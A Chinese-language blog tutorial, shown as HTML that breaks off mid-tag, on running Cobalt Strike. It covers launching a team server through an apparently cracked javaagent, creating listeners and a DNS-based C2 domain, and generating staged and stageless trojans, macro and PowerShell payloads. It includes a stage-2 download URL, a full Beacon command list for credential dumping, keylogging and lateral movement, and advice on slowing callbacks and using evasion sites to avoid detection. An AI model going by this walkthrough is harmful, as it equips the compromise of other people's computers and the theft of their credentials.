class="code"><pre><span class="line"><span class="comment"># start the team server.</span></span><br><span class="line">java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=Microsoft -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=f38eb3d1a335b252b58bc2acde81b542 -Duser.language=en server.TeamServer $*</span><br><span class="line"></span><br><span class="line">-XX:ParallelGCThreads=4 <span class="comment"># 设置并行垃圾回收线程数为4</span></span><br><span class="line">-Dcobaltstrike.server_port=50050 <span class="comment"># 指定端口号为50050</span></span><br><span class="line">-Dcobaltstrike.server_bindto=0.0.0.0 <span class="comment"># 绑定到所有可用的网络接口</span></span><br><span class="line">-Djavax.net.ssl.keyStore=./cobaltstrike.store <span class="comment"># 设置 SSL 的密钥库文件路径为 ./cobaltstrike.store用于SSL/TLS加密连接</span></span><br><span class="line">-Djavax.net.ssl.keyStorePassword=Microsoft <span class="comment"># cobaltstrike.store密钥库的密码为Microsoft</span></span><br><span class="line">-server <span class="comment"># 让JVM使用服务器模式来运行</span></span><br><span class="line">-XX:+AggressiveHeap <span class="comment"># JVM设置</span></span><br><span class="line">-XX:+UseParallelGC  <span class="comment"># 垃圾回收机制</span></span><br><span class="line">-classpath ./cobaltstrike.jar <span class="comment"># 指向主应用程序的 JAR 文件</span></span><br><span class="line">-javaagent:CSAgent.jar=f38eb3d1a335b252b58bc2acde81b542 <span class="comment"># 指定CSAgent.jar文件并传入参数</span></span><br><span class="line">-Duser.language=en <span class="comment"># 设置语言</span></span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>Linux:<code>chmod +x start.sh</code></p><p>Windows: <code>cobaltstrike.bat</code></p><p>如果Java未设置变量请将对应文件中的Java替换为具体的路径</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916576.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">别名 <span class="comment"># 类似于备注随便写</span></span><br><span class="line">主机 <span class="comment"># 写你VPS/虚拟机IP(必须互通)</span></span><br><span class="line">端口 <span class="comment"># teamserver监听的端口</span></span><br><span class="line">用户 <span class="comment"># 随便写,别和同一台服务器中的其他用户重复即可</span></span><br><span class="line">密码 <span class="comment"># 定义的密码</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916045.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916722.png" data-fancybox="true"/></div></div><p>指纹Hash一样,默认点Yes即可</p><h2 id="菜单栏详情"><a href="#菜单栏详情" class="headerlink" title="菜单栏详情"></a>菜单栏详情</h2><h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">New Connection    <span class="comment"># 新建连接，支持连接多个服务器端</span></span><br><span class="line">Preferences            <span class="comment"># 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录Visualization           # 主要展示输出结果的视图</span></span><br><span class="line">VPN Interfaces       <span class="comment"># 设置VPN接口</span></span><br><span class="line">Listenrs                   <span class="comment"># 创建监听器</span></span><br><span class="line">Script Manager      <span class="comment"># 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</span></span><br></pre></td></tr></table></figure><h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Applications        <span class="comment"># 显示受害主机的应用信息</span></span><br><span class="line">Credentials          <span class="comment"># 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz Downloads          # 查看已下载文件</span></span><br><span class="line">Event Log            <span class="comment"># 主机上线记录以及团队协作聊天记录</span></span><br><span class="line">Keystrokes           <span class="comment"># 查看键盘记录结果</span></span><br><span class="line">Proxy Pivots        <span class="comment"># 查看代理模块</span></span><br><span class="line">Screenshots        <span class="comment"># 查看所有屏幕截图</span></span><br><span class="line">Script Console    <span class="comment"># 加载第三方脚本以增强功能 </span></span><br><span class="line">Targets               <span class="comment"># 显示所有受害主机</span></span><br><span class="line">Web Log            <span class="comment"># 所有Web服务的日志</span></span><br></pre></td></tr></table></figure><h3 id="Attacks"><a href="#Attacks" class="headerlink" title="Attacks"></a>Attacks</h3><h4 id="Packages-生成后门"><a href="#Packages-生成后门" class="headerlink" title="Packages(生成后门)"></a>Packages(生成后门)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTML Application      <span class="comment"># 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件MS Office Macro        # 生成office宏病毒文件</span></span><br><span class="line">Payload Generator     <span class="comment"># 生成各种语言版本的payload</span></span><br><span class="line">Windows Executable   <span class="comment"># 生成可执行exe木马</span></span><br><span class="line">Windows Executable(Stageless)   <span class="comment"># 生成无状态的可执行exe木马</span></span><br></pre></td></tr></table></figure><h4 id="Web-Drive-by-钓鱼攻击"><a href="#Web-Drive-by-钓鱼攻击" class="headerlink" title="Web Drive-by(钓鱼攻击)"></a>Web Drive-by(钓鱼攻击)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Manage <span class="comment"># 对开启的web服务进行管理</span></span><br><span class="line">Clone Site <span class="comment"># 克隆网站，可以记录受害者提交的数据</span></span><br><span class="line">Host File <span class="comment"># 提供文件下载，可以选择Mime类型</span></span><br><span class="line">Scripted Web Delivery <span class="comment"># 为payload提供web服务以便下载和执行，类似于Metasploit的</span></span><br><span class="line">web_delivery </span><br><span class="line">Signed Applet Attack <span class="comment"># 使用java自签名的程序进行钓鱼攻击(该方法已过时)</span></span><br><span class="line">Smart Applet Attack <span class="comment"># 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以</span></span><br><span class="line">下版本(该方法已过时)</span><br><span class="line">System Profiler <span class="comment"># 用来获取系统信息，如系统版本，Flash版本，浏览器版本等</span></span><br></pre></td></tr></table></figure><h4 id="钓鱼邮件-弃用"><a href="#钓鱼邮件-弃用" class="headerlink" title="钓鱼邮件(弃用)"></a>钓鱼邮件(弃用)</h4><h4 id="Reporting-报告"><a href="#Reporting-报告" class="headerlink" title="Reporting(报告)"></a>Reporting(报告)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Activity Report <span class="comment"># 活动报告</span></span><br><span class="line">Hosts Report <span class="comment"># 主机报告</span></span><br><span class="line">Indicators of Compromise <span class="comment"># IOC报告:包括C2配置文件的流量分析、域名、IP和上传文件的MD5 </span></span><br><span class="line">hashes</span><br><span class="line">Sessions Report <span class="comment"># 会话报告</span></span><br><span class="line">Social Engineering Report <span class="comment"># 社会工程报告:包括鱼叉钓鱼邮件及点击记录</span></span><br><span class="line">Tactics, Techniques, and Procedures <span class="comment"># 战术技术及相关程序报告:包括行动对应的每种战术的检测</span></span><br><span class="line">策略和缓解策略</span><br><span class="line">Reset Data <span class="comment"># 重置数据</span></span><br><span class="line">Export Data <span class="comment"># 导出数据，导出.tsv文件格式</span></span><br></pre></td></tr></table></figure><h4 id="Help"><a href="#Help" class="headerlink" title="Help"></a>Help</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Homepage <span class="comment"># 官方主页</span></span><br><span class="line">Support <span class="comment"># 技术支持</span></span><br><span class="line">Arsenal <span class="comment"># 开发者</span></span><br><span class="line">System information <span class="comment"># 版本信息</span></span><br><span class="line">About <span class="comment"># 关于</span></span><br></pre></td></tr></table></figure><h2 id="工具栏"><a href="#工具栏" class="headerlink" title="工具栏"></a>工具栏</h2><p>依次为:</p><ol><li>新建连接 </li><li>断开当前连接 </li><li>监听器 </li><li>改变视图为Pivot Graph(视图列表) </li><li>改变视图为Session Table(会话列表) </li><li>改变视图为Target Table(目标列表) </li><li>显示所有以获取的受害主机的凭证 </li><li>查看已下载文件 </li><li>查看键盘记录结果 </li><li>查看屏幕截图 </li><li>生成无状态的可执行exe木马 </li><li>使用java自签名的程序进行钓鱼攻击 </li><li>生成office宏病毒文件 </li><li>为payload提供web服务以便下载和执行 </li><li>提供文件下载，可以选择Mime类型 </li><li>管理Cobalt Strike上运行的web服务 </li><li>帮助 </li><li>关于</li></ol><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><h3 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a>创建监听器</h3><blockquote><p>什么是监听器?</p><p>顾名思义，监听器就是等待被入侵系统连接自己的一个服务。 </p><p>监听器的作用?</p><p>主要是为了接受payload回传的各类数据, 比如payload在目标机器执行以后，就会回连到监听器 , </p><p>然后下载执行真正的shellcode代码</p></blockquote><p>一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境， </p><p>一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。 </p><p>监听器的名字一般由以下结构组成:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Operating System/Payload/Stager </span><br><span class="line">如 : windows/beacon_http/reverse_http </span><br></pre></td></tr></table></figure><p>点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了8个Listener</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916099.png" data-fancybox="true"/></div></div><p>包括dns、http、https、smb tcp 五种协议, External C2, 使用外部的命令与控制(C2)工具或框架，而不是使用 Cobalt Strike 默认的内置监听器, 可以配合其他c2作为后端, Foreign HTTP, 允许Beacon 使用外部的HTTP服务器进行C2通信，而不是使用 Cobalt Strike 内置的Beacon监听器</p><ol><li>Name随便写</li><li>选择所需的Payload</li><li>Host为VPS_IP</li><li>Port为此Payload监听的端口,未被占用即可</li></ol><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916390.png" data-fancybox="true"/></div></div><p>监听成功后,在服务端有对应的日志</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916782.png" data-fancybox="true"/></div></div><h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917271.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917019.png" data-fancybox="true"/></div></div><h3 id="运行木马"><a href="#运行木马" class="headerlink" title="运行木马"></a>运行木马</h3><p>双击木马上线</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917632.png" data-fancybox="true"/></div></div><p>选中受害机右击，选择beacon，即可进行交互，由于受害机默认60秒进行一次回传，可以把时间设置成1或其他，但实际中频率不宜过快，容易被发现</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917687.png" data-fancybox="true"/></div></div><p>或者进入会话,在下方输入<code>sleep 1</code>也可以</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917367.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241953934.png" data-fancybox="true"/></div></div><p>执行系统命令</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917806.png" data-fancybox="true"/></div></div><p>通信图</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917303.png" data-fancybox="true"/></div></div><h2 id="Beacon介绍"><a href="#Beacon介绍" class="headerlink" title="Beacon介绍"></a>Beacon介绍</h2><h3 id="Beacon是什么"><a href="#Beacon是什么" class="headerlink" title="Beacon是什么?"></a>Beacon是什么?</h3><blockquote><p>Beacon是CS的Payload ( 攻击载荷 ) </p><p>Beacon有两种通信模式。</p><ol><li>异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；</li><li>交互式通信模式，这种模式的通信是实时发生的。</li></ol><p>通过HTTP、HTTPS和DNS出口网络。使用SMB协议的时候是点对点通信 </p></blockquote><h3 id="Beacon的类型"><a href="#Beacon的类型" class="headerlink" title="Beacon的类型"></a>Beacon的类型</h3><ul><li>HTTP 和 HTTPS Beacon</li></ul><p>HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。<br>当受害机上线以后，右击选择Interact ，就可以打开Beacon Console</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line">Command                   Description</span><br><span class="line">-------                   -----------</span><br><span class="line">!                         运行历史命令</span><br><span class="line">argue                     命令行参数欺骗</span><br><span class="line">blockdlls                 禁止子进程加载非微软签名的dll</span><br><span class="line">browserpivot              注入浏览器进程代理用户已认证身份(仅支持IE)</span><br><span class="line">cancel                    取消正在下载的文件</span><br><span class="line"><span class="built_in">cd</span>                        跳转目录</span><br><span class="line">checkin                   强制目标回连并更新状态(用于DNS上线，DNS模式下无新任务时目标不会回连Teamserver)</span><br><span class="line">chromedump                提取Chrome保存的账号密码、Cookies等信息</span><br><span class="line">clear                     清空beacon任务队列</span><br><span class="line">connect                   通过TCP正向连接远程Beacon</span><br><span class="line">covertvpn                 部署Covert VPN客户端</span><br><span class="line"><span class="built_in">cp</span>                        复制文件</span><br><span class="line">dcsync                    从域控提取密码<span class="built_in">hash</span></span><br><span class="line">desktop                   远程VNC控制用户桌面</span><br><span class="line">dllinject                 注入一个内存反射加载的dll到目标进程</span><br><span class="line">dllload                   使用LoadLibrary方式在目标进程中加载一个dll</span><br><span class="line">download                  下载文件</span><br><span class="line">downloads                 列出所有正在下载的文件</span><br><span class="line">drives                    列出所有磁盘盘符</span><br><span class="line">elevate                   利用提权漏洞获取一个高权限Beacon</span><br><span class="line">execute                   在目标上执行程序(无回显)</span><br><span class="line">execute-assembly          在目标上内存加载执行本地.NET程序</span><br><span class="line"><span class="built_in">exit</span>                      结束当前Beacon会话</span><br><span class="line">getprivs                  在当前进程访问令牌(access token)中启用system特权</span><br><span class="line">getsystem                 尝试获取SYSTEM用户权限</span><br><span class="line">getuid                    获取当前进程访问令牌(access token)的用户信息</span><br><span class="line">hashdump                  获取本地用户<span class="built_in">hash</span></span><br><span class="line"><span class="built_in">help</span>                      帮助信息</span><br><span class="line"><span class="built_in">history</span>                   显示历史命令记录</span><br><span class="line">inject                    在指定进程中注入新的Beacon会话</span><br><span class="line">inline-execute            在当前会话中执行Beacon Object File</span><br><span class="line">jobkill                   结束一个后台任务</span><br><span class="line"><span class="built_in">jobs</span>                      列出所有后台任务</span><br><span class="line">jump                      在远程机器上植入Beacon(横向移动)</span><br><span class="line">kerberos_ccache_use       从ccache文件导入kerberos票据到当前会话中</span><br><span class="line">kerberos_ticket_purge     清空当前会话中的所有kerberos票据</span><br><span class="line">kerberos_ticket_use       从ticket文件中导入kerberos票据到当前会话中</span><br><span class="line">keylogger                 开启键盘记录</span><br><span class="line"><span class="built_in">kill</span>                      结束指定进程</span><br><span class="line"><span class="built_in">link</span>                      通过命名管道正向连接远程Beacon</span><br><span class="line">logonpasswords            使用mimikatz获取密码和<span class="built_in">hash</span></span><br><span class="line"><span class="built_in">ls</span>                        列出目录文件</span><br><span class="line">make_token                创建进程访问令牌(access token)，仅用于访问网络资源</span><br><span class="line">mimikatz                  运行mimikatz</span><br><span class="line"><span class="built_in">mkdir</span>                     创建目录</span><br><span class="line">mode dns                  使用DNS A记录作为数据通道(仅支持DNS上线Beacon)</span><br><span class="line">mode dns-txt              使用DNS TXT记录作为数据通道(仅支持DNS上线Beacon)</span><br><span class="line">mode dns6                 使用DNS AAAA记录作为数据通道(仅支持DNS上线Beacon)</span><br><span class="line"><span class="built_in">mv</span>                        移动文件</span><br><span class="line">net                       网络和主机探测工具(内置net命令)</span><br><span class="line">note                      给当前会话添加备注信息</span><br><span class="line">portscan                  网络端口扫描</span><br><span class="line">powerpick                 内存执行Powershell命令(不调用powershell.exe)</span><br><span class="line">powershell                通过powershell.exe执行Powershell命令</span><br><span class="line">powershell-import         导入本地powershell脚本到当前会话中</span><br><span class="line">ppid                      为所有新运行的进程设置伪造的父进程PID</span><br><span class="line">printscreen               使用PrintScr方式截屏</span><br><span class="line">ps                        显示进程列表</span><br><span class="line">psinject                  注入到指定进程后在内存中执行Powershell命令(不调用powershell.exe)</span><br><span class="line">pth                       使用Mimikatz执行Pass-the-hash</span><br><span class="line"><span class="built_in">pwd</span>                       显示当前目录</span><br><span class="line">reg                       查询注册表</span><br><span class="line">remote-exec               在远程机器上执行命令(横向移动)</span><br><span class="line">rev2self                  恢复原始进程访问令牌(access token)</span><br><span class="line"><span class="built_in">rm</span>                        删除文件或文件夹</span><br><span class="line">rportfwd                  反向端口转发(从Cobalt Strike Teamserver发起连接)</span><br><span class="line">rportfwd_local            反向端口转发(从Cobalt Strike客户端发起连接)</span><br><span class="line">run                       在目标上执行程序(有回显)</span><br><span class="line">runas                     以另一个用户身份执行程序</span><br><span class="line">runasadmin                以高权限执行程序</span><br><span class="line">runu                      以另一个进程PID作为父进程PID，并以其用户身份执行程序</span><br><span class="line">screenshot                截屏</span><br><span class="line">screenwatch               屏幕监控，每隔一段时间截屏</span><br><span class="line">setenv                    设置环境变量</span><br><span class="line">shell                     使用cmd.exe执行命令</span><br><span class="line">shinject                  注入shellcode到指定进程中</span><br><span class="line">shspawn                   创建傀儡进程并注入shellcode到其中运行</span><br><span class="line"><span class="built_in">sleep</span>                     设置beacon回连间隔时间</span><br><span class="line">socks                     启动SOCKS4a代理服务器</span><br><span class="line">socks stop                停止SOCKS4a代理服务器</span><br><span class="line">spawn                     创建一个新Beacon会话</span><br><span class="line">spawnas                   以另一个用户身份创建一个新Beacon会话</span><br><span class="line">spawnto                   设置创建新进程时使用的可执行文件路径(傀儡进程的宿主exe文件路径)</span><br><span class="line">spawnu                    以另一个进程PID作为父进程PID，并以其用户身份创建一个新Beacon会话</span><br><span class="line">spunnel                   运行第三方agent shellcode并将其反向代理到控制端(从Cobalt Strike Teamserver发起连接)</span><br><span class="line">spunnel_local             运行第三方agent shellcode并将其反向代理到控制端(从Cobalt Strike客户端发起连接)</span><br><span class="line">ssh                       通过SSH连接远程主机(使用账号密码认证)</span><br><span class="line">ssh-key                   通过SSH连接远程主机(使用证书私钥认证)</span><br><span class="line">steal_token               从指定进程中窃取访问令牌(access token)</span><br><span class="line">timestomp                 复制B文件的创建、访问、修改时间戳到A文件(文件时间戳伪造)</span><br><span class="line"><span class="built_in">unlink</span>                    断开与beacon的连接(用于通过TCP、命名管道连接的beacon)</span><br><span class="line">upload                    上传文件</span><br></pre></td></tr></table></figure><p>可用<code>help 命令</code>的方式查看具体命令参数说明</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918299.png" data-fancybox="true"/></div></div><p>退出会话:选中会话 , 右键退出回话 , 然后删除回话 , 如果再次上线了, 再删除一次</p><h2 id="CS上线类型"><a href="#CS上线类型" class="headerlink" title="CS上线类型"></a>CS上线类型</h2><h3 id="exe上线-有阶段"><a href="#exe上线-有阶段" class="headerlink" title="exe上线(有阶段)"></a>exe上线(有阶段)</h3><p>攻击 -&gt; 生成后门 -&gt; windows可执行程序 , 选择监听器和对应的操作系统位数</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918002.webp" data-fancybox="true"/></div></div><p><strong>注意</strong>:有阶段的后门,你在双击时可以在CS的<code>Web Log</code>中可以看到请求信息,这是双击时只是第一阶段会请求网址下载第二阶段的完整后门</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918392.png" data-fancybox="true"/></div></div><p>将VPS的IP和<code>Request:Get</code>后的路径组和起来就是<code>http://192.168.74.131/EjZT</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918854.png" data-fancybox="true"/></div></div><p>有的在线免杀的网站让提供的第二阶段地址就是此地址</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918325.png" data-fancybox="true"/></div></div><h3 id="exe上线-无阶段"><a href="#exe上线-无阶段" class="headerlink" title="exe上线(无阶段)"></a>exe上线(无阶段)</h3><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918110.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918485.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918148.png" data-fancybox="true"/></div></div><p>可以看到无阶段的文件大小要比有阶段的大.这是因为无阶段的将shellcode内置到了木马中.而有阶段需要去下载.更像是小马拉大马</p><h3 id="Staged和Stageless的区别"><a href="#Staged和Stageless的区别" class="headerlink" title="Staged和Stageless的区别"></a>Staged和Stageless的区别</h3><h4 id="生成的exe体积不同"><a href="#生成的exe体积不同" class="headerlink" title="生成的exe体积不同"></a>生成的exe体积不同</h4><h4 id="上线经过的流程不同"><a href="#上线经过的流程不同" class="headerlink" title="上线经过的流程不同"></a>上线经过的流程不同</h4><ol><li>Staged(有阶段): 在有阶段的执行方式中，Cobalt Strike Payload 分为两个主要阶段，即<strong>Stager</strong> 和 <strong>Stage</strong><ol><li>Stager(初始执行载荷):下载器<ol><li><strong>定义:</strong> Stager是Stage 1，是一个较小的、轻量级的初始执行载荷。 </li><li><strong>作用:</strong> 主要任务是与Cobalt Strike团队服务器建立初始连接，并从服务器下载更大的Payload，也就是Stage 2</li></ol></li><li>Stage (完整的执行载荷):<ol><li><strong>定义:</strong> Stage是Stage 2，是一个更大、更完整的执行载荷。 </li><li><strong>作用:</strong> 一旦Stager与Cobalt Strike团队服务器建立连接，Stager会请求下载Stage。Stage是整个Payload的主体，包含了更多的功能和模块。一旦下载，Stage在目标系统上执行，并与Cobalt Strike服务器保持连接，执行渗透测试人员指定的各种命令和操作。</li></ol></li></ol></li><li>Stageless(无阶段):<ol><li><strong>定义:</strong> 在无阶段的执行方式中，整个 Payload 在一次性的过程中直接执行，而不需要分为两个阶段。 </li><li><strong>特点:</strong> 由于无阶段的执行方式减少了与团队服务器的交互，因此可能更难被检测。然而，这也限制了 Payload 的大小，因为整个 Payload 需要在一次连接中传输</li></ol></li></ol><h3 id="Beacon-DNS上线"><a href="#Beacon-DNS上线" class="headerlink" title="Beacon DNS上线"></a>Beacon DNS上线</h3><h4 id="域名的配置"><a href="#域名的配置" class="headerlink" title="域名的配置"></a>域名的配置</h4><p>域名设置如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一条A记录指向CS的IP地址  </span><br><span class="line">vpn.lavaicer.club =&gt; CS的IP地址  </span><br><span class="line">几条NS记录指向刚刚A记录对应的域名(也可以只写一条)  </span><br><span class="line">ns1.lavaicer.club =&gt; vpn.lavaicer.club  </span><br><span class="line">ns2.lavaicer.club =&gt; vpn.lavaicer.club  </span><br><span class="line">ns3.lavaicer.club =&gt; vpn.lavaicer.club</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920986.png" data-fancybox="true"/></div></div><h4 id="创建监听器-1"><a href="#创建监听器-1" class="headerlink" title="创建监听器"></a>创建监听器</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920952.png" data-fancybox="true"/></div></div><h4 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h4><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920371.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以切换为txt</span></span><br><span class="line">beacon&gt; mode dns-txt</span><br></pre></td></tr></table></figure><h3 id="powershell-command上线"><a href="#powershell-command上线" class="headerlink" title="powershell command上线"></a>powershell command上线</h3><p><code>attacks</code>—&gt;<code>Packages</code>—&gt;<code>Payload生成器</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920132.png" data-fancybox="true"/></div></div><p>选择<code>powershell command</code>命令</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920611.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920423.png" data-fancybox="true"/></div></div><h3 id="Scripted-Web-Delivery-S-上线"><a href="#Scripted-Web-Delivery-S-上线" class="headerlink" title="Scripted Web Delivery(S)上线"></a>Scripted Web Delivery(S)上线</h3><p><code>Attacks</code>—&gt;<code>Web Drive-by</code>—&gt;<code>Scripted Web Delivery(S)</code></p><div class="tag-plugin image"><div class="image-bg"><img 